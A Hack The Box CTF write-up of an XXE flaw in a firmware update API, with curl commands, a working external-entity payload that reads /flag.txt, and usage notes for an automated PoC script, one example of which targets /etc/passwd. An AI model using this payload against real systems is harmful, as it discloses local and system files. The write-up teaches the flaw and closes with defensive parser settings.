# Jailbreak (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Jailbreak |
| Category | Web |
| Vulnerability Class | XXE (XML External Entity) |
| Impact | Local file disclosure |
| Target file | `/flag.txt` |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The firmware endpoint `POST /api/update` parses user-controlled XML. External
entity expansion is enabled, and the parsed `<Version>` value is reflected in
the JSON response. This enables an XXE payload to read local files.

## Vulnerable Behavior

1. `/rom` exposes an XML firmware update workflow.
2. `/static/js/update.js` confirms `POST /api/update` with `application/xml`.
3. Backend response includes `Firmware version <Version> update initiated.`
4. Injecting `&xxe;` into `<Version>` leaks local file contents.

## Manual Verification Steps

1. Verify firmware update page:

```bash
curl -s http://<HOST>:<PORT>/rom
```

2. Verify API endpoint from client JavaScript:

```bash
curl -s http://<HOST>:<PORT>/static/js/update.js
```

3. Confirm normal parser behavior:

```bash
curl -s -X POST http://<HOST>:<PORT>/api/update \
  -H 'Content-Type: application/xml' \
  --data '<FirmwareUpdateConfig><Firmware><Version>1.33.7</Version></Firmware></FirmwareUpdateConfig>'
```

Expected signal:
`Firmware version 1.33.7 update initiated.`

4. Exploit XXE to read `/flag.txt`:

```bash
curl -s -X POST http://<HOST>:<PORT>/api/update \
  -H 'Content-Type: application/xml' \
  --data-binary @- <<'EOF'
<?xml version="1.0"?>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
<FirmwareUpdateConfig>
  <Firmware>
    <Version>&xxe;</Version>
  </Firmware>
</FirmwareUpdateConfig>
EOF
```

Expected signal:
response `message` contains `HTB{...}`.

## Automated PoC

Script:
`jailbreak_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Jailbreak"
chmod +x jailbreak_poc.sh
./jailbreak_poc.sh <host> <port> [flag_path]
```

### Common examples

```bash
./jailbreak_poc.sh 154.57.164.64 31561
./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --verbose
./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --json
./jailbreak_poc.sh --host 154.57.164.64 --port 31561 --flag-path /etc/passwd
```

### Options

- `--host <host>`: target host or IP.
- `--port <port>`: target TCP port.
- `--flag-path <path>`: file to read via XXE, default `/flag.txt`.
- `--timeout <seconds>`: HTTP timeout, default `10`.
- `--skip-check`: skip baseline verification request.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug details.
- `-h`, `--help`: show usage help.

### Exit codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: target connectivity failure.
- `4`: baseline verification request failed.
- `5`: exploit request succeeded but no `HTB{...}` token found.

## Why The Exploit Works

- Parser accepts untrusted XML content.
- DTD/entity resolution is enabled.
- External entity points to `file:///flag.txt`.
- Parsed value is reflected in a response field.

## Defensive Guidance

- Disable DTD processing for untrusted XML.
- Disable external entity expansion entirely.
- Use hardened XML parser settings by default.
- Avoid reflecting raw parsed values without strict validation.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.
